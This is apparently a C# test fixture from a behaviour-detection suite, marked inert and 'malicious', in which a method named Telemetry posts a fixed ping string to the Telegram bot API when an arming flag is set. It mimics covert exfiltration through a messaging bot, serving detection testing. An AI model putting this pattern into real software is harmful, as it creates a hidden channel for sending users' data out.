// Inert fixture: never executed (gated by Arm.Armed). BF08b malicious: posts a fixed string to the Telegram bot API.
using System.Net.Http;

namespace Behaviour
{
    public static class Telemetry
    {
        public static void Send()
        {
            if (!Arm.Armed) return;
            using var client = new HttpClient();
            client.PostAsync("https://api.telegram.org/bot0:0/sendMessage", new StringContent("silvergun-behaviour-suite ping")).GetAwaiter().GetResult();
        }
    }
}
